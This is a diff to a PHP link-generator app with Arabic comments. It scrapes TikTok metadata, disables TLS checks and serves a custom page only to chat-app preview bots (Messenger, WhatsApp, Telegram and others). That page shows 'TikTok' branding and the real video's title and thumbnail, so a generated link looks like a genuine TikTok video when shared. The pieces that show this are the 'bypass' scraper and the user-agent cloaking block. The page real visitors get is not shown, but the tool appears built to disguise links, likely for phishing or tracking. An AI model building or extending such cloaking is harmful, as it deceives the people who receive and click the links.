@@ -40,20 +40,50 @@ try {
     die("Database error: " . $e->getMessage());
 }
 
-// دالة متقدمة لسحب البيانات الأصلية وتجاوز الحماية
-function fetch_ultimate_meta($url) {
+// دالة تخطي الحدود لسحب بيانات المعاينة المباشرة والأصلية
+function bypass_and_extract_meta($url) {
     $meta = [
         'title' => 'TikTok · Video',
         'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'
     ];
 
+    // المحاولة الأولى: استخدام oEmbed الرسمية من تيك توك للتصدي للحظر
+    if (strpos($url, 'tiktok.com') !== false) {
+        $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
+        $ch_embed = curl_init();
+        curl_setopt($ch_embed, CURLOPT_URL, $oembed_url);
+        curl_setopt($ch_embed, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch_embed, CURLOPT_TIMEOUT, 4);
+        curl_setopt($ch_embed, CURLOPT_SSL_VERIFYPEER, false);
+        $embed_resp = curl_exec($ch_embed);
+        curl_close($ch_embed);
+
+        if ($embed_resp) {
+            $data = json_decode($embed_resp, true);
+            if (!empty($data['title'])) {
+                $meta['title'] = $data['title'] . " · TikTok";
+            }
+            if (!empty($data['thumbnail_url'])) {
+                $meta['image'] = $data['thumbnail_url'];
+                return $meta;
+            }
+        }
+    }
+
+    // المحاولة الثانية: جلب الصفحة بواسطة Headless Headers محاكية لمتصفحات الجوال
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1');
+    curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 6);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language: en-US,en;q=0.5',
+        'Cache-Control: no-cache',
+        'Pragma: no-cache'
+    ]);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1');
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
     
@@ -135,15 +165,19 @@ if (isset($_GET['r'])) {
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i', $ua);
 
-        // إذا كان الطلب من روبوت تطبيقات الدردشة، نظهر له المعاينة الأصلية بدقة عالية جداً
+        // استجابة مخصصة بالكامل لروبوت ماسنجر لتأكيد الحصول على الصورة والعنوان الأصلي
         if ($is_bot) {
             header('Content-Type: text/html; charset=utf-8');
-            echo '<!DOCTYPE html><html><head>';
+            echo '<!DOCTYPE html><html lang="en"><head>';
+            echo '<meta charset="UTF-8">';
             echo '<meta property="og:site_name" content="TikTok">';
             echo '<meta property="og:type" content="video.other">';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
             echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
-            echo '<meta property="og:url" content="https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . '">';
+            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($meta_image) . '">';
+            echo '<meta property="og:image:type" content="image/jpeg">';
+            echo '<meta property="og:image:width" content="600">';
+            echo '<meta property="og:image:height" content="600">';
             echo '<meta name="twitter:card" content="summary_large_image">';
             echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
             echo '<meta name="twitter:image" content="' . htmlspecialchars($meta_image) . '">';
@@ -309,7 +343,7 @@ if (isset($_GET['r'])) {
     }
 }
 
-// إنشاء رابط جديد
+// إنشاء الرابط
 $generated_link = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
@@ -319,7 +353,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
         $target_url = "https://" . $target_url;
     }
 
-    $scraped = fetch_ultimate_meta($target_url);
+    $scraped = bypass_and_extract_meta($target_url);
     $meta_title = $scraped['title'];
     $meta_image = $scraped['image'];
 
@@ -426,7 +460,7 @@ if (!empty($filter_code)) {
     <div class="wrapper">
         
         <div class="section-box">
-            <h2>Generate Ultimate Link</h2>
+            <h2>Generate Link</h2>
             <form method="POST" enctype="multipart/form-data" class="form-grid">
                 <input type="text" name="target_url" placeholder="Target Video URL (e.g. TikTok / YouTube)..." required>
                 <input type="text" name="sender_name" placeholder="Sender Name (e.g. azez)">
